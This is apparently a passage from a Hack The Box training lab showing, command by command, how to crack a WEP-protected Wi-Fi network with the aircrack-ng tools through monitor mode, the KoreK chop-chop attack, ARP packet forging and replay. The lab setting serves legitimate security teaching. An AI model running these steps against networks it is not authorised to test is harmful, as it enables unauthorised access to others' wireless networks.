#### Enabling Monitor Mode

```sh
3kjS@htb[/htb]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```
#### Performing the Attack

To begin, we scan our target access point using `airodump-ng` and capture the communication into a file. We specify our interface in monitor mode with `wlan0mon`, the channel our access point is running on with `-c`, and the location to save the capture file with the `-w` argument.

```sh
3kjS@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WEP
```

Next, we initiate the `KoreK chop chop` attack in a second terminal. The source MAC address used should be capable of associating with the network. If we need to conduct the attack without authentication and association, there are two options: either omit the `-h` flag (though this can result in dropped packets), or specify the MAC address of an already connected station, which tends to be more reliable. The `-4` option in `aireplay-ng` is used for the KoreK chop chop attack.

```sh
3kjS@htb[/htb]$ aireplay-ng -4 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon
```

Once the attack is completed, we will have two files to work with to forge our ARP request.

```sh
3kjS@htb[/htb]$ ls

replay_dec-0805-221220.cap
replay_dec-0805-221220.xor
```

Now, analyze the decrypted packet to identify the source and destination IP addresses.

```sh
3kjS@htb[/htb]$ tcpdump -s 0 -n -e -r replay_dec-0805-221220.cap
```

```sh
3kjS@htb[/htb]$ packetforge-ng -0 -a C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C -k 192.168.1.1 -l 192.168.1.75 -y replay_dec-0805-221220.xor -w forgedarp.cap

Wrote packet to: forgedarp.cap 
```

```sh
3kjS@htb[/htb]$ aireplay-ng -2 -r forgedarp.cap -h 7E:8D:FC:DD:D7:2C wlan0mon
```
![](Screenshot%202026-09-21%20at%2015.45.36.png)

```sh
3kjS@htb[/htb]$ aireplay-ng -3 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon
```

Once we have generated enough packets, we can use `aircrack-ng` to crack the WEP key using the captured Initialization Vectors (IVs) stored in the `WEP-01.cap` file.

```sh
3kjS@htb[/htb]$ aircrack-ng -b C8:D1:4D:EA:21:A6 WEP-01.cap
```
